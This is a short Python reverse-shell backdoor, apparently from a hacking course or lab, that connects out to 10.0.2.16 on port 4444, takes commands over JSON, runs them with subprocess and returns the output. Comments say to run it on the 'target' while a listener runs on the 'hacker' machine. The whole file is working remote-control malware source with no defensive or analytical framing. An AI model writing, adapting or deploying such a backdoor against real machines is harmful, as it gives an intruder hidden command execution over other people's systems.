#!/usr/bin/env python
import socket,subprocess,json
class Backdoor:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        self.connection.connect((ip,port))
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)   
    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue            
    def execute_system_command(self,command):
        return subprocess.check_output(command)
    def run(self):
        while True:
            command=self.reliable_receive() 
            command_result=self.execute_system_command(command) 
            self.reliable_send(command_result)
        self.connection.close()
backdoor_instance=Backdoor("10.0.2.16",4444)
backdoor_instance.run()        


# execute this in target
# at same time execute listener1_class.py in hacker
